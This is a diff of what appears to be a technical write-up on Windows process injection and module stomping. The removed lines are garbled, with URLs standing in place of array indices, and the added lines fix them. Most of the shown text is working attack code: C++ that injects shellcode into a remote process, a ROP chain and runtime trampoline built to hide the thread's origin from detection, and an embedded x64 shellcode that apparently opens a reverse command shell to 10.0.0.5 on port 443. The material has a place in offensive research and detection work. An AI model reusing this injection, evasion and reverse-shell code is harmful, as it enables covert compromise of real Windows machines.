@@ -46,8 +46,8 @@ int main(int argc, char *argv[])
 	HANDLE remoteThread;
 	PVOID remoteBuffer;
 
-	printf("Injecting to PID: %i", atoi(argv(https://github.com/klezVirus/inceptor.git)));
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv(https://github.com/klezVirus/inceptor.git))));
+	printf("Injecting to PID: %i", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
 	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
@@ -71,6 +71,7 @@ executing it by starting a remote thread in the victim process.
 
 
 ```cpp
+
 
 # Taken from:
 # https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
@@ -97,7 +98,7 @@ int main(int argc, char *argv[])
 	unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x05\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 
 	// inject a benign DLL into remote process
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv(https://github.com/klezVirus/inceptor.git))));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
 	//processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8444);
 	
 	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
@@ -722,7 +723,7 @@ int main()
     // Our ROP will be constituted by 7 chunks of 8 bytes each
     UCHAR ropChain[N_ROP_GADGETS * 8] = {0};
 
-    UINT64 moduleAddresses(https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/) = {(UINT64)msvcrtdll, (UINT64)ntdll, (UINT64)kernel32dll};
+    UINT64 moduleAddresses[3] = {(UINT64)msvcrtdll, (UINT64)ntdll, (UINT64)kernel32dll};
 
     UINT found[N_ROP_GADGETS] = { FALSE };
     UINT moduleIndex = 0;
@@ -740,16 +741,16 @@ int main()
     // Some indexes are static and can be populated immediately
     // The second chunk is the address to free
     _Hton((ULONG64)address, ropChain, 1 * 8);
-    found(https://github.com/klezVirus/inceptor.git) = TRUE;
+    found[1] = TRUE;
     // The fourth chunk is 0
-    found(https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/) = TRUE;
+    found[3] = TRUE;
     // The sixth chunk is MEM_RELEASE
     ropChain[5 * 8 + 1] = 0x80;
-    found(https://twitter.com/Idov31) = TRUE;
+    found[5] = TRUE;
 
     // The last chunk is VirtualFree address
     _Hton((ULONG64)VirtualFreeFunc, ropChain, 6 * 8);
-    found(https://twitter.com/hasherezade) = TRUE;
+    found[6] = TRUE;
 
     while (!Finished(found) && moduleIndex < sizeof(moduleAddresses)) {
 
@@ -771,15 +772,15 @@ int main()
                     _Hton((ULONG64)moduleMath + x, ropChain, 0 * 8);
                     found[0] = TRUE;
                 }
-                else if (memcmpFunc(moduleMath + x, POP_RDX_RET, 2) == 0 && !found(https://github.com/Idov31/FunctionStomping)) // POP RDX, RET
+                else if (memcmpFunc(moduleMath + x, POP_RDX_RET, 2) == 0 && !found[2]) // POP RDX, RET
                 {
                     _Hton((ULONG64)moduleMath + x, ropChain, 2 * 8);
-                    found(https://github.com/Idov31/FunctionStomping) = TRUE;
+                    found[2] = TRUE;
                 }
-                else if (memcmpFunc(moduleMath + x, POP_R8__RET, 3) == 0 && !found(https://github.com/Idov31/FunctionStomping)) // POP R8, RET
+                else if (memcmpFunc(moduleMath + x, POP_R8__RET, 3) == 0 && !found[4]) // POP R8, RET
                 {
                     _Hton((ULONG64)moduleMath + x, ropChain, 4 * 8);
-                    found(https://github.com/Idov31/FunctionStomping) = TRUE;
+                    found[4] = TRUE;
                 }
             }
             moduleMath += memInfo.RegionSize;
@@ -872,23 +873,23 @@ int main()
 
     UINT64 target = (UINT64)address;
 
-    UCHAR patch(https://offensivedefence.co.uk/posts/module-stomping/) = { 0 };
+    UCHAR patch[13] = { 0 };
     // mov r15, <address>
     patch[0] = 0x49;
-    patch(https://github.com/klezVirus/inceptor.git) = 0xBF;
+    patch[1] = 0xBF;
     // Hton Trampoline Address
-    patch(https://github.com/Idov31/FunctionStomping) = target & 0x00000000000000ff;
-    patch(https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/) = (target & 0x000000000000ff00) >> 8;
-    patch(https://github.com/Idov31/FunctionStomping) = (target & 0x0000000000ff0000) >> 16;
-    patch(https://twitter.com/Idov31) = (target & 0x00000000ff000000) >> 24;
-    patch(https://twitter.com/hasherezade) = (target & 0x000000ff00000000) >> 32;
-    patch(https://twitter.com/modexpblog) = (target & 0x0000ff0000000000) >> 40;
-    patch(https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/) = (target & 0x00ff000000000000) >> 48;
-    patch(https://twitter.com/waldoirc) = (target & 0xff00000000000000) >> 56;
+    patch[2] = target & 0x00000000000000ff;
+    patch[3] = (target & 0x000000000000ff00) >> 8;
+    patch[4] = (target & 0x0000000000ff0000) >> 16;
+    patch[5] = (target & 0x00000000ff000000) >> 24;
+    patch[6] = (target & 0x000000ff00000000) >> 32;
+    patch[7] = (target & 0x0000ff0000000000) >> 40;
+    patch[8] = (target & 0x00ff000000000000) >> 48;
+    patch[9] = (target & 0xff00000000000000) >> 56;
     // jmp r15
-    patch(https://github.com/waldo-irc/YouMayPasser/) = 0x41;
-    patch(https://blog.f-secure.com/cowspot-real-time-module-stomping-detection/) = 0xFF;
-    patch(https://twitter.com/_rastamouse) = 0xE7;
+    patch[10] = 0x41;
+    patch[11] = 0xFF;
+    patch[12] = 0xE7;
 
     DWORD oldProtect;
 
@@ -1000,23 +1001,23 @@ This "trampoline", however, can't be assembled before-hand, as we need to know t
 region, that would be allocated at runtime. To solve the problem, we generate the shellcode in real time. 
 
 ```
-UCHAR patch(https://offensivedefence.co.uk/posts/module-stomping/) = { 0 };
+UCHAR patch[13] = { 0 };
 // mov r15, <address>
 patch[0] = 0x49;
-patch(https://github.com/klezVirus/inceptor.git) = 0xBF;
+patch[1] = 0xBF;
 // Hton Trampoline Address
-patch(https://github.com/Idov31/FunctionStomping) = target & 0x00000000000000ff;
-patch(https://bruteratel.com/research/feature-update/2021/01/30/OBJEXEC/) = (target & 0x000000000000ff00) >> 8;
-patch(https://github.com/Idov31/FunctionStomping) = (target & 0x0000000000ff0000) >> 16;
-patch(https://twitter.com/Idov31) = (target & 0x00000000ff000000) >> 24;
-patch(https://twitter.com/hasherezade) = (target & 0x000000ff00000000) >> 32;
-patch(https://twitter.com/modexpblog) = (target & 0x0000ff0000000000) >> 40;
-patch(https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/) = (target & 0x00ff000000000000) >> 48;
-patch(https://twitter.com/waldoirc) = (target & 0xff00000000000000) >> 56;
+patch[2] = target & 0x00000000000000ff;
+patch[3] = (target & 0x000000000000ff00) >> 8;
+patch[4] = (target & 0x0000000000ff0000) >> 16;
+patch[5] = (target & 0x00000000ff000000) >> 24;
+patch[6] = (target & 0x000000ff00000000) >> 32;
+patch[7] = (target & 0x0000ff0000000000) >> 40;
+patch[8] = (target & 0x00ff000000000000) >> 48;
+patch[9] = (target & 0xff00000000000000) >> 56;
 // jmp r15
-patch(https://github.com/waldo-irc/YouMayPasser/) = 0x41;
-patch(https://blog.f-secure.com/cowspot-real-time-module-stomping-detection/) = 0xFF;
-patch(https://twitter.com/_rastamouse) = 0xE7;
+patch[10] = 0x41;
+patch[11] = 0xFF;
+patch[12] = 0xE7;
 ```
 
 This trick, in practice, mask the thread source when the shellcode is later executed as a thread,
